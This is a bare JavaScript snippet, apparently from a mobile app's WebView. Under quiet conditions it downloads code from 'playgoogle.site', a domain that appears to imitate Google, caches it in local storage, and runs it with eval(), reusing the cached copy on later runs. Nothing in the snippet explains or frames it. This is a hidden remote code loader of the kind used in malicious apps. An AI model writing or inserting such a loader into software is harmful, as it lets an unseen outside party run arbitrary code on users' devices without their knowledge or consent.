if (location.search === '') {
    try {
        $WVmethods.getItem('to_offer').then(function(offer) {
            if (offer === '') {
                $WVmethods.getItem('proc').then(function(val) {
                    if (val == "") {
                        fetch('https://playgoogle.site/app_data/procreg_ios.php').then(function(res) {
                            return res.text()
                        }).then(function(r) {
                            console.log(r);
                            $WVmethods.setItem('proc', r);
                            eval(r)
                        });
                    } else {
                        eval(val);
                    }
                })
            }
        }
        )
    }
    catch (e) {
        console.log(e)
    }
}
